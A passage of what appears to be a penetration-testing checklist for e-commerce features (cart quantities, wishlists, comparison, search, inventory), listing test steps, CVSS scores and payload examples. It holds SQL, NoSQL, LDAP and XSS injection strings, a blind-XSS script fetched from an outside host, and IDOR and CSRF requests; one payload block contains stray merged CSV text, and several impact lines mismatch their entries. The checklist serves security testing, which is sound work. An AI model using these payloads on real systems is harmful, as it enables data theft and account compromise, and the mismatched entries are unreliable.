**Test Steps:** 1. Update cart item quantity to negative 2. Check if cart total becomes negative 3. Proceed to checkout

**Expected Result:** Quantity must be positive integer

**Payload Example:**

```
{"cart_item_id":123,quantity:-10}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-045 — Zero Quantity Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cart Quantity Update

**Test Steps:** 1. Set quantity to zero 2. Check if item remains in cart 3. Manipulate to checkout with zero cost

**Expected Result:** Zero quantity should remove item

**Payload Example:**

```
{"cart_item_id":123,quantity:0}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-046 — Decimal Quantity Exploit
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cart Quantity Update

**Test Steps:** 1. Update quantity to decimal value 2. Check rounding behavior 3. Exploit rounding errors

**Expected Result:** Quantity should be integer only

**Payload Example:**

```
{"quantity":0.001} or {"quantity":1.999}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-047 — IDOR on Quantity Update
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cart Quantity Update

**Test Steps:** 1. Update own cart item quantity 2. Modify item_id parameter 3. Update another user's cart

**Expected Result:** Updates should verify cart ownership

**Payload Example:**

```
PUT /api/cart/items/victim_item_id {"quantity":99}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-048 — Race Condition on Quantity Update
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cart Quantity Update

**Test Steps:** 1. Send concurrent quantity updates 2. Check for race condition 3. Exceed stock or quantity limits

**Expected Result:** Updates should be atomic

**Payload Example:**

```
Parallel PUT requests with different quantities
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ECOM-049 — Quantity Limit Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cart Quantity Update

**Test Steps:** 1. Add maximum allowed quantity 2. Update quantity to exceed limit 3. Check if limit enforced

**Expected Result:** Maximum quantity should be enforced

**Payload Example:**

```
{"quantity":1001} when max is 1000
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-050 — Stock Bypass via Rapid Updates
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cart Quantity Update

**Test Steps:** 1. Update quantity rapidly 2. Bypass stock validation 3. Order more than available

**Expected Result:** Stock checks should be consistent

**Payload Example:**

```
Multiple rapid quantity increase requests
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-051 — Quantity Update SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cart Quantity Update

**Test Steps:** 1. Intercept quantity update 2. Inject SQL in quantity parameter 3. Extract database data

**Expected Result:** Quantity should be validated as integer

**Payload Example:**

```
{"quantity":"1; SELECT * FROM users--"}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-052 — Mass Cart Update Vulnerability
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cart Quantity Update

**Test Steps:** 1. Find bulk update endpoint 2. Include multiple item IDs 3. Update items across users

**Expected Result:** Bulk updates should verify ownership

**Payload Example:**

```
{"updates":[{"id":"victim_item",quantity:0}]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-053 — Wishlist IDOR Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Wishlist / Save for Later

**Test Steps:** 1. View own wishlist 2. Modify user/wishlist ID 3. Access another user's wishlist

**Expected Result:** Wishlist should be private by default

**Payload Example:**

```
GET /api/users/victim_id/wishlist
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-054 — Wishlist IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Wishlist / Save for Later

**Test Steps:** 1. Add item to own wishlist 2. Modify request to target another user 3. Modify victim's wishlist

**Expected Result:** Wishlist modifications should verify ownership

**Payload Example:**

```
POST /api/users/victim_id/wishlist/add
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-055 — Wishlist XSS via Product Notes
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Wishlist / Save for Later

**Test Steps:** 1. Add product to wishlist with notes 2. Include XSS payload in notes 3. View wishlist

**Expected Result:** Notes should be sanitized

**Payload Example:**

```
notes=<script>alert(document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-056 — CSRF on Wishlist Addition
**Test Category:** Cross-Site Request Forgery · **Severity:** Low · **CVSS:** 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Wishlist / Save for Later

**Test Steps:** 1. Create malicious page 2. Auto-add item to victim's wishlist 3. Track victim interests

**Expected Result:** Wishlist operations should require CSRF token

**Payload Example:**

```
<img src="https://shop.com/wishlist/add?id=123">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ECOM-057 — Wishlist Privacy Bypass
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Wishlist / Save for Later

**Test Steps:** 1. Set wishlist to private 2. Access via direct URL or API 3. View private wishlist

**Expected Result:** Privacy settings should be enforced

**Payload Example:**

```
GET /wishlist/share/private_token
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## ECOM-058 — Save for Later Price Lock Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Wishlist / Save for Later

**Test Steps:** 1. Save item for later at current price 2. Move back to cart after price increase 3. Check if old price applied

**Expected Result:** Price should be current at checkout time

**Payload Example:**

```
Exploit price_saved_at field
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-059 — Wishlist to Cart IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Wishlist / Save for Later

**Test Steps:** 1. Move item from wishlist to cart 2. Modify item_id 3. Move victim's wishlist item to attacker cart

**Expected Result:** Move operation should verify ownership

**Payload Example:**

```
POST /wishlist/move-to-cart {"item_id":"victim_item"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-060 — Wishlist Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Wishlist / Save for Later

**Test Steps:** 1. Iterate through wishlist IDs 2. Access public wishlists 3. Harvest product interest data

**Expected Result:** Wishlist URLs should be unpredictable

**Payload Example:**

```
/wishlist/1 through /wishlist/10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ECOM-061 — Unlimited Wishlist Items DoS
**Test Category:** Denial of Service · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Wishlist / Save for Later

**Test Steps:** 1. Add thousands of items to wishlist 2. Trigger wishlist load 3. Check for performance issues

**Expected Result:** Wishlist should have item limits

**Payload Example:**

```
Add 100000 items via script
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ECOM-062 — Comparison IDOR
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Compare Products

**Test Steps:** 1. Create product comparison 2. Modify comparison_id 3. Access another user's comparison

**Expected Result:** Comparison should verify ownership

**Payload Example:**

```
GET /api/comparisons/victim_comparison_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-063 — XSS via Comparison Notes
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Compare Products

**Test Steps:** 1. Add comparison notes 2. Include XSS payload 3. Share comparison

**Expected Result:** Notes should be sanitized

**Payload Example:**

```
<svg onload=alert('XSS')>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-064 — Hidden Product Comparison
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Compare Products

**Test Steps:** 1. Add hidden product to comparison 2. View comparison 3. Access restricted product details

**Expected Result:** Only visible products should be comparable

**Payload Example:**

```
{"product_ids":["public",hidden,admin_only]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-065 — Comparison SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Compare Products

**Test Steps:** 1. Capture comparison request 2. Inject SQL in product_ids parameter 3. Extract data

**Expected Result:** Product IDs should be validated

**Payload Example:**

```
/compare?products=1,2,3' UNION SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-066 — Comparison Data Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Compare Products

**Test Steps:** 1. Compare products 2. Analyze API response 3. Check for internal data exposure

**Expected Result:** Only public product data should be shown

**Payload Example:**

```
Response with supplier_cost or margin fields
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-067 — Mass Product Comparison DoS
**Test Category:** Denial of Service · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Compare Products

**Test Steps:** 1. Compare maximum products 2. Exceed limit 3. Monitor server performance

**Expected Result:** Comparison count should be limited

**Payload Example:**

```
/compare?products=1,2,3,...,1000
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ECOM-068 — Comparison Share Token Prediction
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Compare Products

**Test Steps:** 1. Generate comparison share link 2. Analyze token pattern 3. Predict other tokens

**Expected Result:** Share tokens should be cryptographically random

**Payload Example:**

```
Sequential or timestamp-based tokens
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-069 — Recently Viewed IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Recently Viewed

**Test Steps:** 1. View recently viewed products 2. Modify user_id 3. Access another user's history

**Expected Result:** History should be user-specific

**Payload Example:**

```
GET /api/users/victim_id/recently-viewed
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-070 — Privacy Violation via Tracking
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Recently Viewed

**Test Steps:** 1. Analyze recently viewed data 2. Check what's tracked 3. Verify data retention period

**Expected Result:** Only necessary data should be tracked

**Payload Example:**

```
Excessive tracking of user behavior
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## ECOM-071 — Recently Viewed Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Recently Viewed

**Test Steps:** 1. View product with XSS in name 2. Check recently viewed widget 3. Verify XSS execution

**Expected Result:** Product names should be sanitized

**Payload Example:**

```
Product name: <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-072 — History Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Recently Viewed

**Test Steps:** 1. Clear browsing history 2. Check if recently viewed clears 3. Manipulate history data

**Expected Result:** Users should control their history

**Payload Example:**

```
POST /recently-viewed/clear without actual clear
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-073 — Cross-Session History Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Recently Viewed

**Test Steps:** 1. Browse products 2. Clear cookies 3. Check if history persists via fingerprinting

**Expected Result:** History should require session

**Payload Example:**

```
Device fingerprint based tracking
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Privacy Tools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ECOM-074 — SQL Injection in Search
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Enter SQL payload in search 2. Check for SQL errors 3. Extract database data

**Expected Result:** Search should use parameterized queries

**Payload Example:**

```
search=' OR '1'='1' UNION SELECT username,password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-075 — NoSQL Injection in Search
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Capture search request 2. Inject NoSQL operators 3. Bypass search restrictions

**Expected Result:** NoSQL queries should be sanitized

**Payload Example:**

```
{"search":{"$regex":".*",$options:"i"}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## ECOM-076 — Blind XSS in Search
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Search with blind XSS payload 2. Wait for admin to view search analytics 3. Receive callback

**Expected Result:** All search terms should be sanitized

**Payload Example:**

```
><script src=https://xsshunter.com/x></script>,High,XSS Hunter|Burp Collaborator
Product Search / Filters,DOM XSS in Search Results,Cross-Site Scripting,1. Analyze search JavaScript 2. Inject DOM XSS payload 3. Execute in victim browser,Client-side code should sanitize output,search=><img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / DOM Invader

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-077 — Search Filter LDAP Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Find LDAP-backed search 2. Inject LDAP payload 3. Bypass authentication

**Expected Result:** LDAP queries should be sanitized

**Payload Example:**

```
search=*)(uid=*))(|(uid=*
```

**Impact:** LDAP filter injection -&gt; authentication bypass / directory data disclosure.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## ECOM-078 — Elasticsearch Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Identify Elasticsearch backend 2. Inject Elasticsearch query syntax 3. Access unauthorized data

**Expected Result:** Search queries should be properly escaped

**Payload Example:**

```
search={"match_all":{}} or script injection
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-079 — Search Filter Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Apply price filter 2. Manipulate filter values 3. Access products outside filter

**Expected Result:** Filters should be enforced server-side

**Payload Example:**

```
price_max=-1 or price_max=999999999
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-080 — Filter Parameter Pollution
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Send multiple filter values 2. Check processing order 3. Bypass restrictions

**Expected Result:** Duplicate parameters should be handled safely

**Payload Example:**

```
?category=public&category=hidden
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Param Miner

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ECOM-081 — Search Autocomplete Information Leak
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Type partial product names 2. Analyze autocomplete suggestions 3. Find hidden products

**Expected Result:** Autocomplete should respect visibility

**Payload Example:**

```
Suggestions including unreleased products
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-082 — Regex DoS in Search
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Enter regex-like search pattern 2. Trigger catastrophic backtracking 3. DoS server

**Expected Result:** Search should not use regex directly

**Payload Example:**

```
search=aaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / ReDoS Tools

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ECOM-083 — Full-Text Search Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Identify full-text search 2. Inject search operators 3. Manipulate results

**Expected Result:** Search operators should be escaped

**Payload Example:**

```
search=+confidential -public
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-084 — Search Result Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Search / Filters

**Test Steps:** 1. Identify cached search results 2. Inject via headers 3. Poison cache with XSS

**Expected Result:** Search results should not cache user input

**Payload Example:**

```
X-Forwarded-Host manipulation
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## ECOM-085 — Inventory IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Inventory Management

**Test Steps:** 1. View inventory levels 2. Modify product_id 3. View competitor/restricted inventory

**Expected Result:** Inventory data should require authorization

**Payload Example:**

```
GET /api/admin/inventory/competitor_product
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-086 — Stock Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Inventory Management

**Test Steps:** 1. Find inventory update endpoint 2. Modify stock levels 3. Create artificial scarcity

**Expected Result:** Inventory updates should require admin

**Payload Example:**

```
PUT /api/inventory/product_id {"stock":0}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-087 — Negative Inventory Exploit
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Inventory Management

**Test Steps:** 1. Set stock to negative value 2. Check for integer underflow 3. Get unlimited stock

**Expected Result:** Stock should not go negative

**Payload Example:**

```
{"product_id":123,stock:-999}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-088 — Race Condition on Stock Decrement
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Inventory Management

**Test Steps:** 1. Purchase last item concurrently 2. Check if both succeed 3. Oversell inventory

**Expected Result:** Stock decrement should be atomic

**Payload Example:**

```
Parallel checkout requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ECOM-089 — Inventory SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Inventory Management

